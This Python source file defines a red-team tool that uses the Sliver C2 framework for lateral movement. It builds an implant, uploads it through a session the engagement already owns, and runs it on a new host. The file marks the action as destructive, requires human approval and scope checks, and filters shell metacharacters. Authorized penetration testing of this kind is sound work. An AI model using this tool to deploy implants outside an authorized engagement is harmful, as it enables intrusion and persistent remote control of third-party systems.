"""``nexus.c2.sliver_deploy``: lateral movement via an owned session (DESTRUCTIVE).

The action is ``lateral``: build a fresh implant, upload it to a *new* host
through a session the current engagement already owns, and (optionally) execute
it there. The new implant checks back in as its own Sliver session, which
``nexus.c2.sliver_sessions`` then registers — that registration is the verified
post-condition of a successful hop.

Deploying a payload on a third-party host is destructive, so it always requires
human approval and the owning session must be registered for the engagement.
"""

from __future__ import annotations

import re

from nexus_core.integrations.sliver.client import SliverError
from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult
from nexus_core.kernel.schema_validation import validate
from nexus_core.kernel.sessions import SessionRegistry, validate_session_scope
from nexus_core.tools.handlers.sliver_common import build_client, error_result
from nexus_core.tools.handlers.sliver_exec import SHELL_METACHARACTERS
from nexus_core.tools.handlers.sliver_generate import (
    ARCHS,
    FORMATS,
    OSES,
    _generation_arguments,
)

TOOL_ID = "nexus.c2.sliver_deploy"
ACTIONS = ("lateral",)
KINDS = ("session", "beacon")
SESSION_ID_PATTERN = r"[A-Za-z0-9_-]{1,64}"
MAX_PATH_CHARS = 512
MAX_ARGS = 16
MAX_ARG_CHARS = 256


def sliver_deploy_definition(tenant_id: str = "system") -> ToolDefinition:
    return ToolDefinition(
        tool_id=TOOL_ID,
        name="Deploy Sliver implant laterally",
        tenant_id=tenant_id,
        description=(
            "Movimiento lateral: genera un implante, lo sube a un host nuevo a "
            "través de una session propia y lo ejecuta. La nueva session aparece "
            "en nexus.c2.sliver_sessions. DESTRUCTIVA: siempre requiere aprobación."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "session_id": {
                    "type": "string",
                    "pattern": "^" + SESSION_ID_PATTERN + "$",
                    "minLength": 1,
                    "maxLength": 64,
                },
                "action": {"type": "string", "enum": list(ACTIONS), "default": "lateral"},
                "kind": {"type": "string", "enum": list(KINDS), "default": "session"},
                "remote_path": {"type": "string", "minLength": 1, "maxLength": MAX_PATH_CHARS},
                "os": {"type": "string", "enum": list(OSES)},
                "arch": {"type": "string", "enum": list(ARCHS)},
                "format": {"type": "string", "enum": list(FORMATS), "default": "executable"},
                "beacon": {"type": "boolean", "default": False},
                "interval": {"type": "integer", "minimum": 1, "maximum": 86400},
                "jitter": {"type": "integer", "minimum": 0, "maximum": 100},
                "name": {"type": "string", "maxLength": 64},
                "persistent": {"type": "boolean", "default": False},
                "args": {
                    "type": "array",
                    "items": {"type": "string", "maxLength": MAX_ARG_CHARS},
                    "maxItems": MAX_ARGS,
                },
                "run": {"type": "boolean", "default": True},
            },
            "required": ["session_id", "remote_path", "os", "arch"],
            "additionalProperties": False,
        },
        risk=RiskLevel.DESTRUCTIVE,
        effect="lateral_movement",
        required_permissions=[f"execute:tool:{TOOL_ID}"],
        timeout_seconds=420,
        max_output_bytes=200_000,
        scope_target_field=None,
        scope_required=True,
    )


def _validated_path(value: object) -> str:
    text = str(value or "")
    if not text or len(text) > MAX_PATH_CHARS:
        raise ValueError("remote_path must be 1..512 characters")
    if any(char in text for char in ("\x00", "\n", "\r")):
        raise ValueError("remote_path must be a single line")
    return text


def _validated_args(value: object) -> list[str]:
    if value is None:
        return []
    if not isinstance(value, (list, tuple)) or len(value) > MAX_ARGS:
        raise ValueError("args must be a list of at most 16 strings")
    args = []
    for item in value:
        text = str(item)
        if not text or len(text) > MAX_ARG_CHARS:
            raise ValueError("argument length out of range")
        if any(char in text for char in SHELL_METACHARACTERS):
            raise ValueError("arguments must not contain shell metacharacters")
        args.append(text)
    return args


async def sliver_deploy_handler(arguments: dict, context: RunContext) -> ToolResult:
    validate(arguments, sliver_deploy_definition().input_schema)
    session_id = arguments["session_id"]
    if not isinstance(session_id, str) or not re.fullmatch(SESSION_ID_PATTERN, session_id):
        raise ValueError("invalid session id")
    if str(arguments.get("action") or "lateral").lower() not in ACTIONS:
        raise ValueError("action must be lateral")
    kind = str(arguments.get("kind") or "session").lower()
    if kind not in KINDS:
        raise ValueError("kind must be one of session, beacon")
    remote_path = _validated_path(arguments.get("remote_path"))
    args = _validated_args(arguments.get("args"))
    run = bool(arguments.get("run", True))
    # Validates os/arch/format/beacon/interval/jitter/name/persistent too.
    generation = _generation_arguments(arguments)

    try:
        validate_session_scope(context)
    except PermissionError:
        return ToolResult(verification_method="session_scope_required")
    registry = SessionRegistry(context.store)
    denied = registry.denial(context, session_id)
    if denied is not None:
        return denied
    client, failure = build_client()
    if failure is not None:
        return failure
    try:
        await client.connect()
        info, data = await client.generate_implant(**generation)
        if not data:
            return ToolResult(verification_method="sliver_implant_empty")
        uploaded = await client.upload_file(
            session_id, remote_path, data, kind=kind
        )
        executed = None
        if run:
            executed = await client.execute_path(
                session_id, remote_path, args=args, kind=kind
            )
        return ToolResult(
            output=client.redact(
                {
                    "action": "lateral",
                    "session_id": session_id,
                    "kind": kind,
                    "implant": info,
                    "remote_path": uploaded.get("path", remote_path),
                    "executed": executed is not None,
                    "pivot_host_session": session_id,
                    "note": (
                        "el nuevo implante aparecerá como su propia session; "
                        "regístrala con nexus.c2.sliver_sessions"
                    ),
                }
            ),
            verified=True,
            verification_method="sliver_implant_deployed",
            evidence={
                "session_id": session_id,
                "kind": kind,
                "implant_sha256": info["sha256"],
                "implant_size": info["size"],
                "os": generation["os_name"],
                "arch": generation["arch"],
                "persistent": generation["persistent"],
                "remote_path": uploaded.get("path", remote_path),
                "ran": run,
                "pid": (executed or {}).get("pid", 0),
            },
        )
    except SliverError as exc:
        return error_result(exc, tool_id=TOOL_ID)
    except (ValueError, TypeError):
        return ToolResult(verification_method="sliver_response_invalid")
    finally:
        await client.disconnect()
